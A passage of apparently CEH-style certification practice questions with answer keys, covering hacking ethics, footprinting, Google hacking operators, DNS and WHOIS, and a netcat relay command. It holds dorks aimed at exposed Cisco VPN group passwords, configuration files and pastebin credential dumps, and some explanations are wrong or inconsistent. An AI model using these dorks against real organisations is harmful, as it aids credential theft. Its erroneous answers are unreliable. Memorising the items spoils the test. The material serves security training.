89. A computer technician is using the latest version of a word-processing software and discovers that a particular sequence of characters is causing the entire computer to crash. The technician researches the bug and discovers that no one else has experienced the problem. What is the appropriate next step?
+ [x] Notify the vendor of the bug and do not disclose it until the vendor gets a chance to issue a fix.
+ [ ] Ignore the problem completely and let someone else deal with it.
+ [ ] Find an underground bulletin board and attempt to sell the bug to the highest bidder.
+ [ ] Create a document that will crash the computer when opened and send it to friends.
> **Explanation:**
> + If any technician or a professional discovers a bug in an application, then it is their responsibility to notify the vendor of the bug and not to disclose it until the vendor has had a chance to issue a fix. Otherwise, an attacker can take advantage of the bug.

90. Which of the following tasks DOES NOT fall under the scope of ethical hacking?
+ [ ] Vulnerability scanning
+ [ ] Risk assessment
+ [x] Defense-in-depth implementation
+ [ ] Pen testing
> **Explanation:**
> + Ethical hacking is a structured and organized security assessment, usually as part of a penetration test or security audit. Ethical hackers determine the scope of the security assessment according to the client's security concerns. Many ethical hackers are members of a “tiger team.” A tiger team works together to perform a full-scale test covering all aspects of the network, as well as physical and system intrusion.
> + Defense-in-depth implementation is the job role of a network security engineer where several protection layers are placed throughout an information system to prevent direct attacks. If a hacker gains access to a system, defense in depth minimizes any adverse impact and gives network security administrators and engineers time to deploy new or updated countermeasures to prevent a recurrence of intrusion.

91. Stephany is the leader of an information security team of a global corporation that has several branch offices around the world. In the past six months, the company has suffered several security incidents. The CSIRT explains to Stephany that the incidents have something in common: the source IP addresses of all the incidents are from one of the new branches. A lot of the outsourcing staff come to this office to connect their computers to the LAN. What is the most accurate security control to implement to resolve the primary source of the incidents?
+ [x] Network access control (NAC)
+ [ ] Awareness to employees
+ [ ] Antimalware application
+ [ ] Internal Firewall
> **Explanation:**
> Network access control (also known as network administration control) deals with restricting the availability of a network to the end user depending on the security policy. It mainly restricts systems without antivirus, intrusion prevention software from accessing the network. NAC allows you to create policies for each user or systems and define policies for networks in terms of IP addresses.
> 
> NAC performs the following actions:
> + Evaluates unauthorized users, devices, or behaviors in the network. It provides access to authorized users and other entities. 
> + It helps in identifying users and devices on a network. It also determines whether these users and devices are secure or not.
> + Examines the system integration with the network according to the security policies of the organization.
>
> In this environment, there are a lot of outside devices coming in and out of the company with no controls. If we implement NAC we can say who can get into the network and what policies they need to comply with.

92. Juan is the administrator of a Windows domain for a global corporation. He uses his knowledge to scan the internal network to find vulnerabilities without the authorization of his boss; he tries to perform an attack and gain access to an AIX server to show the results to his boss. What kind of role is shown in the scenario?
+ [x] Gray Hat hacker
+ [ ] Annoying employee
+ [ ] White Hat hacker
+ [ ] Black Hat hacker
> **Explanation:**
> + Gray hats are the individuals who work both offensively and defensively at various times. They fall between white and black hats. Gray hats might help hackers in finding various vulnerabilities of a system or network and at the same time help vendors to improve products (software or hardware) by checking limitations and making them more secure. 
> + In the above scenario, despite doing the hack without authorization, Juan only wants to do good for the company. He was checking the limitations of the organization network and not looking for benefits. This is the behavior of a gray hat hacker.
> + A white hat always looks for authorization, and the black hat always seeks profit.

93. Why is ethical hacking necessary? (Select two.)
+ [ ] Ethical hackers are responsible for selecting security solutions and try to verify the ROI of security systems.
+ [x] Ethical hackers try to find if all the components of information systems are adequately protected, updated, and patched
+ [x] Ethical hackers try to find what an intruder can see on the system under evaluation.
+ [ ] Ethical hackers are responsible for incident handling and response in the organization.
> **Explanation:**
> + Ethical hacking is necessary as it allows countering attacks from malicious hackers by anticipating methods used by them to break into a system. Ethical hacking helps to predict the various possible vulnerabilities well in advance and rectify them without inciting any attack from outsiders. As hacking involves creative thinking, vulnerability testing and security audits cannot guarantee that the network is secure. Organizations need to implement a "defense-in-depth" strategy and perform penetration testing of their networks to estimate and expose vulnerabilities.

94. Highlander, Incorporated, decides to hire an ethical hacker to identify vulnerabilities at the regional locations and ensure system security. What is the main difference between a hacker and an ethical hacker when they are trying to compromise the regional offices?
+ [ ] Hackers have more sophisticated tools.
+ [ ] Ethical hackers have the permission of the regional server administrators.
+ [ ] Hackers don’t have any knowledge of the network before they compromise the network.
+ [x] Ethical Hackers have the permission of upper management.
> **Explanation:**
> + Ethical hackers have the permission of upper management (those with authority to approve the test)

95. You have been hired to do an ethical hacking (penetration Testing) for a company. Which is the first thing you should do in this process?
+ [ ] Perimeter Testing
+ [x] Network information gathering
+ [ ] Acquiring Target
+ [ ] Escalating Privileges
> **Explanation:**
> The three phases of penetration testing include pre-attack phase, attack phase and post-attack phase.
> 
> **Pre-Attack Phase**
> + Planning and preparation
> + Methodology designing
> + Network information gathering
> 
> **Attack Phase**
> + Penetrating perimeter
> + Acquiring target
> + Escalating privileges
> + Execution, implantation, retracting
> 
> **Post-Attack Phase**
> + Reporting
> + Clean-up
> + Artifact destruction

96. A security consultant is trying to bid on a large contract that involves penetration testing and reporting. The company accepting bids wants proof of work, so the consultant prints out several audits that they have performed for previous companies. Which of the following is likely to occur as a result?
+ [ ] The company accepting bids will hire the consultant because of the great work performed.
+ [x] The consultant may expose vulnerabilities of other companies.
+ [ ] The company accepting bids will want the same type of format of testing.
+ [ ] The consultant will ask for money on the bid because of great work.
> **Explanation:**
> + For a security consultant, it is compulsory to sign a nondisclosure agreement (NDA). An NDA is also known as confidential document agreement. It is a legal contract to protect the organization’s sensitive information. A typical NDA specifies the information that the penetration testing team (security consultant) is not allowed to disclose to other parties.
> + If the security consultant is showing audit reports of previous companies as a proof of work to the current client, it means they are exposing vulnerabilities of the previous companies to the current client—because audit report contains all the confidential information about threats or vulnerabilities found during penetration testing.

# 02. Footprinting and Reconnaissance
## Footprinting Concepts
97. Passive reconnaissance involves collecting information through which of the following?
+ [x] Publicly accessible sources
+ [ ] Social engineering
+ [ ] Email tracking
+ [ ] Traceroute analysis
> **Explanation:**
> Passive footprinting involves gathering information about the target without direct interaction. We can only collect the archived and stored information from about the target using publicly accessible sources such as search engines, social networking sites, job sites, groups, forums, and blogs, and so on.
> 
> Active footprinting involves gathering information about the target with direct interaction. In active footprinting, we overtly interact with the target network.
> Active footprinting techniques include:
> + Querying published name servers of the target
> + Performing traceroute analysis
> + Performing social engineering
> + Gathering information through email tracking
> + Performing Whois lookup
> + Extracting DNS information

98. A penetration tester was hired to perform a penetration test for a bank. The tester began searching for IP ranges owned by the bank, performing lookups on the bank’s DNS servers, reading news articles online about the bank, watching the bank employees time in and out, searching the bank’s job postings (paying special attention to IT-related jobs), and visiting the local dumpster for the bank’s corporate office. What phase of the penetration test is the tester currently in?
+ [ ] Information reporting
+ [ ] Vulnerability assessment
+ [ ] Active information gathering
+ [x] Passive information gathering
> **Explanation:**
> + Passive footprinting involves information gathering about the target without direct interaction. This type of footprinting is useful when there is a requirement that the information gathering activities are not to be detected by the target. Performing passive footprinting is technically difficult, as active traffic is not sent to the target organization from a host or from anonymous hosts or services over the Internet.

99. Which of the following technique is used to gather information about the target without direct interaction with the target?
+ [ ] Enumeration
+ [ ] Scanning
+ [x] Passive Footprinting
+ [ ] Active Footprinting
> **Explanation:**
> + Passive footprinting involves gathering information about the target without direct interaction. We can only collect the archived and stored information from about the target using publicly accessible sources such as search engines, social networking sites, job sites, groups, forums, and blogs, and so on.
> + Active footprinting involves gathering information about the target with direct interaction. In active footprinting, we overtly interact with the target network. Scanning and enumeration are the methods of active footprinting.

100. A pen tester was hired to perform penetration testing on an organization. The tester was asked to perform passive footprinting on the target organization. Which of the following techniques comes under passive footprinting?
+ [ ] Performing social engineering
+ [ ] Performing traceroute analysis
+ [ ] Querying published name servers of the target
+ [x] Finding the top-level domains (TLDs) and sub-domains of a target through web services
> **Explanation:**
> Passive footprinting involves gathering information about the target without direct interaction. We can only collect the archived and stored information from about the target using publicly accessible source.
> 
> Passive footprinting techniques include:
> + Finding information through search engines
> + Finding the Top-level Domains (TLDs) and sub-domains of a target through web services
> + Collecting location information on the target through web services
> + Performing people search using social networking sites and people search services
> + Gathering financial information about the target through financial services
> + Gathering infrastructure details of the target organization through job sites
> + Monitoring target using alert services
> 
> Active footprinting involves gathering information about the target with direct interaction. In active footprinting, we overtly interact with the target network.
> 
> Active footprinting techniques include:
> + Querying published name servers of the target
> + Extracting metadata of published documents and files
> + Gathering website information using web spidering and mirroring tools
> + Gathering information through email tracking
> + Performing Whois lookup
> + Extracting DNS information
> + Performing traceroute analysis
> + Performing social engineering

101. Which of the following is a network threat?
+ [ ] Privilege escalation
+ [ ] Arbitrary code execution
+ [x] Session hijacking
+ [ ] SQL injection
> **Explanation:**
> There are three types of information security threats:
> 
> Network Threats:
> + Information gathering
> + Sniffing and eavesdropping
> + Spoofing
> + Session hijacking
> + Man-in-the-Middle attack
> 
> Host Threats:
> + Malware attacks
> + Footprinting
> + Password attacks
> + Denial-of-Service attacks
> + Arbitrary code execution
> + Privilege escalation
> + Backdoor attacks
> 
> Application Threats:
> + Improper data/input validation
> + Authentication and authorization attacks
> + Security misconfiguration
> + SQL injection
> + Phishing

102. Smith works as a professional Ethical Hacker with a large MNC. He is a CEH certified professional and was following the CEH methodology to perform the penetration testing. He is assigned a project for information gathering on a client’s network. He started penetration testing and was trying to find out the company’s sub-domains to get information about the different departments and business units. Smith was unable to find any information.  
What should Smith do to get the information he needs?
+ [ ] Smith should use email tracking tools such as eMailTrackerPro to find the company’s sub-domains
+ [ ] Smith should use WayBackMachine in Archive.org to find the company’s sub-domains
+ [x] Smith should use online services such as netcraft.com to find the company’s sub-domains
+ [ ] Smith should use website mirroring tools such as HTTrack Website Copier to find the company’s sub-domains
> **Explanation:**
> + A company's top-level domains (‘TLDs’) and sub-domains can provide a lot of useful information to an attacker. Netcraft provides internet security services including anti-fraud and anti-phishing services, application testing and PCI scanning. They also analyze the market share of web servers, operating systems, hosting providers and SSL certificate authorities and other parameters of the internet.
> 
> + The archive.org is an Internet Archive from Wayback Machine that stores archived versions of websites. It allows an attacker to gather information on an organization’s web pages since their creation. As the website https://archive.org keeps track of web pages from the time of their inception, an attacker can retrieve even information removed from the target website.
> 
> + HTTrack is an offline browser utility. It downloads a Website from the Internet to a local directory, building all directories recursively, getting HTML, images, and other files from the server. HTTrack arranges the original site’s relative link-structure. Simply open a page of the “mirrored” website in a browser, browse the site from link to link, as if viewing it online.
> 
> + eMailTrackerPro analyzes email headers and reveals information such as sender’s geographical location, IP address and so on. It allows an attacker to review the traces later by saving past traces.

103. Which of the following countermeasure helps organizations to prevent information disclosure through banner grabbing?
+ [ ] Disable the DNS zone transfers to the untrusted hosts
+ [x] Display false banners
+ [ ] Restrict anonymous access through RestrictNullSessAccess parameter from the Windows registry
+ [ ] Disable open relay feature
> **Explanation:**
> When attackers connect to the open port using banner grabbing techniques, the system presents a banner containing sensitive information such as OS, server type, and version. With the help of the information gathered, the attacker identifies specific vulnerabilities to exploit and thereafter launches attacks.
> 
> The countermeasures to defend against banner grabbing attacks are as follows:
> + Display false banners to mislead or deceive attackers.
> + Turn off unnecessary services on the network host to limit information disclosure.
> + Disabling open relay feature protect from SMTP enumeration
> + Disabling the DNS zone transfers to the untrusted hosts protect from DNS enumeration
> + Restricting anonymous access through RestrictNullSessAccess parameter from the Windows Registry protect from SMB enumeration

104. Which of the following database is used to delete the history of the target website?
+ [ ] TCP/IP and IPSec filters
+ [ ] Implement VPN
+ [ ] WhoIs Lookup database
+ [x] archive.org
> **Explanation:**
> + TCP/IP and IPSec filters are generally used for defense in depth.  
> + archive.org is used to delete the history of the organization’s website from archive database.  
> + WhoIs Lookup database is used to retrieve WhoIs records of the target organization.  
> + Hide the IP address and the related information by implementing VPN or keeping server behind a secure proxy

105. Sean works as a professional ethical hacker and penetration tester. He is assigned a project for information gathering on a client’s network. He started penetration testing and was trying to find out the company’s internal URLs, looking for any information about the different departments and business units. Sean was unable find any information. What should Sean do to get the information he needs?
+ [ ] Sean should use WayBackMachine in Archive.org
+ [ ] Sean should use website mirroring tools
+ [x] Sean should use Sublist3r tool
+ [ ] Sean should use email tracking tools
> **Explanation:**
> + Sublist3r is a python script designed to enumerate subdomains of websites using OSINT. It enables you to enumerate subdomains across multiple sources at once. It helps penetration testers and bug hunters collect and gather subdomains for the domain they are targeting. It enumerates subdomains using many search engines such as Google, Yahoo, Bing, Baidu, and Ask. It also enumerates subdomains using Netcraft, Virustotal ThreatCrowd, DNSdumpster, and ReverseDNS. It has integrated the venerable SubBrute, allowing you to also brute force subdomains using a wordlist.

106. InfoTech Security hired a penetration tester Sean to do physical penetration testing. On the first day of his assessment, Sean goes to the company posing as a repairman and starts checking trash bins to collect the sensitive information. What is Sean trying to do?
+ [x] Trying to attempt social engineering by dumpster diving
+ [ ] Trying to attempt social engineering using phishing
+ [ ] Trying to attempt social engineering by shoulder surfing
+ [ ] Trying to attempt social engineering by eavesdropping
> **Explanation:**
> + Here, sean is trying to perform dumpster diving.
> + Dumpster diving is the process of retrieving sensitive personal or organizational information by searching through trash bins. It can extract confidential data such as user IDs, passwords, policy numbers, network diagrams, account numbers, bank statements, salary data, source code, sales forecasts, access codes, phone lists, credit card numbers, calendars, and organizational charts on paper or disk.


## Open Source Footprinting
107. Which results will be returned with the following Google search query? site:target.com -site:Marketing.target.com accounting
+ [ ] Results matching all words in the query
+ [x] Results matching “accounting” in domain target.com but not on the site Marketing.target.com
+ [ ] Results from matches on the site marketing.target.com that are in the domain target.com but do not include the word accounting
+ [ ] Results for matches on target.com and Marketing.target.com that include the word “accounting”
> **Explanation:**
> + “site” Google search operator restricts search results to the specified site or domain. It allows you to see the URLs they have indexed of your website. Adding [-] to most operators tells Google to search for anything but that particular text.
> + Here, the query will search for “accounting” in target.com domain but not on the Marketing.target.com domain because [-] is added before the Marketing.target.com domain in the query.

108. You are doing a research on SQL injection attacks. Which of the following combination of Google operators will you use to find all Wikipedia pages that contain information about SQL, injection attacks or SQL injection techniques?
+ [ ] site:Wikipedia.org intitle:“SQL Injection”
+ [ ] allinurl: Wikipedia.org intitle:“SQL Injection”
+ [x] SQL injection site:Wikipedia.org
+ [ ] site:Wikipedia.org related:“SQL Injection”
> **Explanation:**
> + Site operator restricts the results of those websites in the given domain.
> + For example, the [SQL Injection site:Wikipedia.org] query gives information on SQL injection from the wikipedia.org site.
> + Intitle restricts the results to documents containing the search keyword in the title, and double quotes around search terms restrict the results to the pages that contain the exact search term.
> + Allinurl restricts the results to those pages with all of the search keywords in the URL. This operator displays websites that are similar or related to the URL specified.

109. Information gathered from social networking websites such as Facebook, Twitter, and LinkedIn can be used to launch which of the following types of attacks?
+ [ ] Distributed denial of service attack
+ [x] Social engineering attack
+ [ ] Smurf attack
+ [ ] SQL injection attack
> **Explanation:**
> + Smurf attacks attempt to cause users on a network to flood each other with data, making it appear as if everyone is attacking each other, and leaving the hacker anonymous.
> + Social engineering refers to tricking individuals into divulging sensitive information. The objective here is to extract sensitive information and catalog it. Social networking sites allow you to find people by name, keyword, company, school, their friends, colleagues, and the people living around them. Searching for people on these sites returns personal information such as name, position, organization name, current location, and educational qualifications. You can also find professional information such as a company or business, current location, phone number, e-mail ID, photos, videos and so on. Social networking sites such as Twitter are used to share advice, news, concerns, opinions, rumors, and facts. Through people searching on social networking services, an attacker can gather critical information that is helpful in performing social engineering attacks.
> + SQL injection is the most common web vulnerability and is used to take advantage of nonvalidated inputs in web applications to pass SQL commands through a web application, for execution by a backend database.
> + A distributed denial-of-service attack is a type of attack where multiple infected systems are used to pound a single online system or service that makes the server useless, slow, and unavailable for a legitimate use for a short period. The attacker initiates the attack by first exploiting the vulnerabilities in the devices and then installing malicious software in their operating systems. These multiple compromised devices are referred to as an army of bots.

110. Which Google search query can you use to find mail lists dumped on pastebin.com?
+ [x] `site:pastebin.com intext:*@*.com:*`
+ [ ] `allinurl: pastebin.com intitle:”mail lists”`
+ [ ] `cache: pastebin.com intitle:*@*.com:*`
+ [ ] `allinurl: pastebin.com intitle:*@*.com:*`
> **Explanation:**
> + The site operator restricts the results to those websites in the given domain, and the query intext:term restricts results to documents containing term in the text.
> + For example, the [site:pastebin.com intext:*@*.com:*] query gives information on mail list from the pastebin.com site.
> + Intitle restricts the results to documents containing the search keyword in the title, and double quotes around search terms restrict the results to the pages that contain the exact search term.
> + Allinurl restricts the results to those with all search keywords in the URL related operator lists web pages that are similar to a specified web page.

111. Which Google search query will search for any configuration files a target certifiedhacker.com may have?
+ [ ] site: certifiedhacker.com intext:xml | intext:conf | intext:cnf | intext:reg | intext:inf | intext:rdp | intext:cfg | intext:txt | intext:ora | intext:ini
+ [ ] site: certifiedhacker.com ext:xml || ext:conf || ext:cnf || ext:reg || ext:inf || ext:rdp || ext:cfg || ext:txt || ext:ora || ext:ini
+ [x] site: certifiedhacker.com filetype:xml | filetype:conf | filetype:cnf | filetype:reg | filetype:inf | filetype:rdp | filetype:cfg | filetype:txt | filetype:ora | filetype:ini
+ [ ] allinurl: certifiedhacker.com ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | ext:ora | ext:ini
> **Explanation:**
> + The “site” operator restricts the results to those websites in the given domain.
> + Filetype operator restricts the results to pages whose names end in suffix.
> + This operator restricts results to only those pages containing all the query terms specified in the URL.
> + The query intext:term restricts results to documents containing term in the text.

112. What is the output returned by search engines when extracting critical details about a target from the Internet?
+ [ ] Operating systems, location of web servers, users and passwords
+ [ ] Open ports and Services
+ [x] Search Engine Results Pages (‘SERPs’)
+ [ ] Advanced search operators
> **Explanation:**
> + Search engines are the main information sources to locate key information about a target organization. Search engines play a major role in extracting critical details about a target from the Internet. It returns a list of Search Engine Results Pages (‘SERPs’). Many search engines can extract target organization information such as employee details, login pages, intranet portals, contact information and so on.

113. Which of the following techniques is used to create complex search engine queries?
+ [ ] Bing Search
+ [ ] Yahoo Search
+ [ ] DuckDuckGo
+ [x] Google hacking
> **Explanation:**
> + Google hacking refers to use of advanced Google search operators for creating complex search queries to extract sensitive or hidden information. The accessed information is then used by attackers to find vulnerable targets. Footprinting using advanced Google hacking techniques gathers information by Google hacking, a hacking technique to locate specific strings of text within search results, using an advanced operator in the Google search engine.

114. Sean works as a penetration tester in ABC firm. He was asked to gather information about the target company. Sean begins with social engineering by following the steps:
+ Secretly observes the target to gain critical information 
+ Looks at employee’s password or PIN code with the help of binoculars or a low-power telescope
Based on the above description, identify the social engineering technique.
+ [x] Shoulder surfing
+ [ ] Tailgating
+ [ ] Dumpster diving
+ [ ] Phishing
> **Explanation:**
> + Here, sean is trying to perform dumpster diving.
> + Shoulder surfing is the technique of observing or looking over someone’s shoulder as he/she keys in information into a device. Shoulder surfing helps penetration tester to find out passwords, personal identification numbers, account numbers, and other information. Penetration tester sometimes even uses binoculars or other optical devices, or install small cameras to record actions performed on victim’s system, to obtain login details and other sensitive information.

115. Which one of the following is a Google search query used for VoIP footprinting to extract Cisco phone details?
+ [ ] inurl:/voice/advanced/ intitle:Linksys SPA configuration
+ [x] inurl:”NetworkConfiguration” cisco
+ [ ] inurl:”ccmuser/logon.asp”
+ [ ] intitle:"D-Link VoIP Router" "Welcome"
> **Explanation:**
> Google search queries for VoIP footprinting
>
> + **`intitle:"Login Page" intext:"Phone Adapter Configuration Utility"`** Pages containing login portals
> + **`inurl:/voice/advanced/ intitle:Linksys SPA configuration`** Finds the Linksys VoIP router configuration page
> + **`intitle:"D-Link VoIP Router" "Welcome"`** Pages containing D-Link login portals
> + **`intitle:asterisk.management.portal web-access`** Look for the Asterisk management portal
> + **`inurl:”NetworkConfiguration” cisco`** Find the Cisco phone details
> + **`inurl:”ccmuser/logon.asp”`** Find Cisco call manager
> + **`intitle:asterisk.management.portal web-access`** Finds the Asterisk web management portal
> + **`inurl:8080 intitle:”login” intext:”UserLogin” “English”`** VoIP login portals
> + **`intitle:” SPA Configuration”`** Search Linksys phones

116. Which one of the following is a Google search query used for VPN footprinting to find Cisco VPN client passwords?
+ [ ] inurl:/remote/login?lang=en
+ [x] "[main]" "enc_GroupPwd=" ext:txt
+ [ ] "Config" intitle:"Index of" intext:vpn
+ [ ] filetype:pcf "cisco" "GroupPwd"
> **Explanation:**
> Google advanced operators help refine searches to expose sensitive information, vulnerabilities, and passwords. You can use these google hacking operators or Google dorks for footprinting VoIP and VPN networks. You can extract information such as pages containing login portals, VoIP login portals, directory with keys of VPN servers, and so on.
> 
> The following tables list some of the google hacking operators or google dorks to obtain specific information related to VPN footprinting.
> + **`filetype:pcf "cisco" "GroupPwd"`** Cisco VPN files with Group Passwords for remote access
> + **`"[main]" "enc_GroupPwd=" ext:txt`** Finds Cisco VPN client passwords (encrypted, but easily cracked!)
> + **`"Config" intitle:"index of" intext:vpn`** Directory with keys of VPN servers
> + **`inurl:/remote/login?lang=en`** Finds FortiGate Firewall's SSL-VPN login portal
> + **`!Host=*.* intext:enc_Userpassword=* ext:pcf`** Look for .pcf files which contains user VPN profiles
> + **`filetype:rcf inurl:vpn`** Find Sonicwall Global VPN Client files containing sensitive information and login
> + **`filetype:pcf vpn OR Group`** Finds publicly accessible profile configuration files (.pcf) used by VPN clients


## Domain and Network Footprinting
117. A hacker is attempting to use nslookup to query Domain Name Service (DNS). The hacker uses the nslookup interactive mode for the search. Which command should the hacker type into the command shell to request the appropriate records?
+ [ ] Request type=ns
+ [ ] Transfer type=ns
+ [ ] Locate type=ns
+ [x] Set type=ns
> **Explanation:**
> The nslookup is a network administration command-line tool generally used for querying the Domain Name System (DNS) to obtain a domain name or IP address mapping or for any other specific DNS record.
> 
> The following table lists the valid values for this command:
> + **A** Specifies a computer’s IP address
> + **ANY** Specifies a computer’s IP address
> + **CNAME** Specifies a canonical name for an alias
> + **GID** Specifies a group identifier of a group name
> + **HINFO** Specifies a computer’s CPU and type of operating system
> + **MB** Specifies a mailbox domain name
> + **MG** Specifies a mail group member
> + **MINFO** Specifies mailbox or mail list information
> + **MR** Specifies the mail rename domain name
> + **MX** Specifies the mail exchanger
> + **NS** Specifies a DNS name server for the named zone
> + **PTR** Specifies a computer name if the query is an IP address
> + **SOA** Specifies the start-of-authority for a DNS zone
> + **TXT** Specifies the text information
> + **UID** Specifies the user identifier
> + **UINFO** Specifies the user information

118. Which of the following tools consists of a publicly available set of databases that contain personal information of domain owners?
+ [ ] Web spidering tools
+ [x] WHOIS lookup tools
+ [ ] Traceroute tools
+ [ ] Metadata extraction tools
> **Explanation:**
> + WHOIS is a query and response protocol that is widely used for querying databases that store the registered users or assignees of an Internet resource, such as a domain name, an IP address block, or an autonomous system but is also used for a wider range of other information. The protocol stores and delivers database content in a human-readable format.
> + Whois Lookup tools extract information such as IP address, hostname or domain name, registrant information, DNS records including country, city, state, phone and fax numbers, network service providers, administrators and technical support information for any IP address or domain name.

119. What is the outcome of the command “nc -l -p 2222 | nc 10.1.0.43 1234”?
+ [ ] Netcat will listen for a connection from 10.1.0.43 on port 1234 and output anything received to port 2222.
+ [ ] Netcat will listen on the 10.1.0.43 interface for 1234 seconds on port 2222.
+ [ ] Netcat will listen on port 2222 and then output anything received to local interface 10.1.0.43.
+ [x] Netcat will listen on port 2222 and output anything received to a remote connection on 10.1.0.43 port 1234.
> **Explanation:**
> Netcat is a networking utility that reads and writes data across network connections, using the TCP/IP protocol. It is a reliable “back-end” tool used directly or driven by other programs and scripts. It is also a network debugging and exploration tool.
> 
> Netcat options: 
> ```
> ┌──(kali㉿kali)-[~]
> └─$ nc -h   
> [v1.10-47]
> connect to somewhere:   nc [-options] hostname port[s] [ports] ... 
> listen for inbound:     nc -l -p port [-options] [hostname] [port]
> options:
>         -c shell commands       as `-e'; use /bin/sh to exec [dangerous!!]
>         -e filename             program to exec after connect [dangerous!!]
>         -b                      allow broadcasts
>         -g gateway              source-routing hop point[s], up to 8
>         -G num                  source-routing pointer: 4, 8, 12, ...
>         -h                      this cruft
>         -i secs                 delay interval for lines sent, ports scanned
>         -k                      set keepalive option on socket
>         -l                      listen mode, for inbound connects
>         -n                      numeric-only IP addresses, no DNS
>         -o file                 hex dump of traffic
>         -p port                 local port number
>         -r                      randomize local and remote ports
>         -q secs                 quit after EOF on stdin and delay of secs
>         -s addr                 local source address
>         -T tos                  set Type Of Service
>         -t                      answer TELNET negotiation
>         -u                      UDP mode
>         -v                      verbose [use twice to be more verbose]
>         -w secs                 timeout for connects and final net reads
>         -C                      Send CRLF as line-ending
>         -z                      zero-I/O mode [used for scanning]
> port numbers can be individual or ranges: lo-hi [inclusive];
> hyphens in port names must be backslash escaped (e.g. 'ftp\-data').
>                                                                                                                                                                                                                                           >  
> ┌──(kali㉿kali)-[~]
> └─$ 
> ```
> In the above query, Netcat will listen on port 2222 and output anything received to a remote connection on 10.1.0.43 port 1234.

120. What information is gathered about the victim using email tracking tools?
+ [ ] Information on an organization’s web pages since their creation.
+ [ ] Username of the clients, operating systems, email addresses, and list of software.
+ [x] Recipient's IP address, Geolocation, Proxy detection, Operating system and Browser information.
+ [ ] Targeted contact data, extracts the URL and meta tag for website promotion.
> **Explanation:**
> Email tracking monitors the emails of a particular user. This kind of tracking is possible through digitally time stamped records that reveal the time and date when the target receives and opens a specific email. Email tracking tools allows you to collect information such as IP addresses, mail servers, and service provider involved in sending the mail.
> 
> Information gathered about the victim using email tracking tools:
> + Recipient's system IP address
> + Geolocation
> + Email received and Read
> + Read duration
> + Proxy detection
> + Links
> + Operating system and Browser information
> + Forward Email
> + Device Type

121. Which of the following tools allows an attacker to extract information such as sender identity, mail server, sender’s IP address, location, and so on?
+ [x] Email Tracking Tools
+ [ ] Metadata Extraction Tools
+ [ ] Website Mirroring Tools
+ [ ] Web Updates Monitoring Tools
> **Explanation:**
> Email tracking monitors the emails of a particular user. This kind of tracking is possible through digitally time stamped records that reveal the time and date when the target receives and opens a specific email. Email tracking tools allows an attacker to collect information such as IP addresses, mail servers, and service provider involved in sending the mail.
> 
> Information gathered about the victim using email tracking tools:
> + Recipient's system IP address
> + Geolocation
> + Email received and Read
> + Read duration
> + Proxy detection
> + Links
> + Operating system and Browser information
> + Forward Email
> + Device Type

122. Which of the following is a query and response protocol used for querying databases that store the registered users or assignees of an Internet resource, such as a domain name, an IP address block, or an autonomous system?
+ [ ] DNS Lookup
+ [ ] Traceroute
+ [ ] TCP/IP
+ [x] WhoIs Lookup
> **Explanation:**
> Whois is a query and response protocol used for querying databases that store the registered users or assignees of an Internet resource, such as a domain name, an IP address block, or an autonomous system. This protocol listens to requests on port 43 (TCP). Regional Internet Registries (RIRs) maintain Whois databases and it contains the personal information of domain owners. For each resource, Whois database provides text records with information about the resource itself, and relevant information of assignees, registrants, and administrative information (creation and expiration dates). 
> 
> Whois query returns following information:
> + Domain name details
> + Domain name servers
> + NetRange
> + When a domain has been created
> + Contact details of domain owner
> + Expiry records 
> + Records last updated
> 
> TCP/IP, or the Transmission Control Protocol/Internet Protocol, is a suite of communication protocols used to interconnect network devices on the internet. TCP/IP can also be used as a communications protocol in a private network (an intranet or an extranet).
> 
> DNS Lookup reveals information about DNS zone data. DNS zone data include DNS domain names, computer names, IP addresses, and much more about a particular network.
> 
> The Traceroute utility can detail the path travelled by IP packets between two systems. The utility can trace the number of routers the packets travel through, the round trip time (duration in transiting between two routers), and, if the routers have DNS entries, the names of the routers and their network affiliation. It can also trace geographic locations.

123. Which of the following regional internet registries (RIRs) provides services related to the technical coordination and management of Internet number resources in Canada, the United States, and many Caribbean and North Atlantic islands?
+ [ ] APNIC
+ [ ] AFRINIC
+ [x] ARIN
+ [ ] LACNIC
> **Explanation:**
> + AFRINIC (African Network Information Center) responsible for the distribution and management of Internet number resources such as IP addresses and ASN (Autonomous System Numbers) for the African region.
> + American Registry for Internet Numbers (ARIN) is a nonprofit, member-based organization that supports the operation and growth of the Internet which provides services related to the technical coordination and management of Internet number resources. ARIN accomplishes this by carrying out its core service, which is the management and distribution of Internet number resources such as Internet Protocol (IP) addresses and Autonomous System Numbers (ASNs). ARIN manages these resources within its service region, which is comprised of Canada, the United States, and many Caribbean and North Atlantic islands.
> + APNIC (Asia Pacific Network Information Center) is one of the five RIRs charged with ensuring the fair distribution and responsible for the management of IP addresses and related resources required for the stable and reliable operation of the global Internet.
> + LACNIC (Latin American and Caribbean Network Information Center) is an international non-government organization responsible for assigning and administering Internet numbering resources (IPv4, IPv6), autonomous system numbers, reverse resolution, and other resources for the Latin America and Caribbean region.

124. Which of the following DNS record type helps in DNS footprinting to determine domain’s mail server?
+ [ ] CNAME
+ [ ] NS
+ [ ] A
+ [x] MX
> **Explanation:**
> DNS footprinting, namely Domain Name System footprinting, reveals information about DNS zone data. DNS zone data include DNS domain names, computer names, IP addresses, and much more about a particular network. An attacker uses DNS information to determine key hosts in the network, and then performs social engineering attacks to gather even more information.
> 
> DNS footprinting helps in determining following records about the target DNS:
> + **A** Points to a host’s IP address
> + **MX** Points to domain’s mail server
> + **NS** Points to host’s name server
> + **CNAME** Canonical naming allows aliases to a host
> + **SOA** Indicate authority for domain
> + **SRV** Service records
> + **PTR** Maps IP address to a hostname
> + **RP** Responsible person
> + **HINFO** Host information record includes CPU type and OS
> + **TXT** Unstructured text records

125. Which of the following utility uses the ICMP protocol concept and Time to Live (‘TTL’) field of IP header to find the path of the target host in the network?
+ [x] Traceroute
+ [ ] DNS Lookup
+ [ ] WhoIs
+ [ ] TCP/IP
> **Explanation:**
> + **WhoIs** Lookup is a query and response protocol used for querying databases that store the registered users or assignees of an Internet resource, such as a domain name, an IP address block, or an autonomous system.
> + **Traceroute** uses the ICMP protocol concept and Time to Live (‘TTL’) field of IP header to find the path of the target host in the network. The Traceroute utility can detail the path IP packets travel between two systems. The utility can trace the number of routers the packets travel through, the round trip time (duration in transiting between two routers), and, if the routers have DNS entries, the names of the routers and their network affiliation. It can also trace geographic locations.
> + **DNS Lookup** reveals information about DNS zone data. DNS zone data include DNS domain names, computer names, IP addresses, and much more about a particular network.
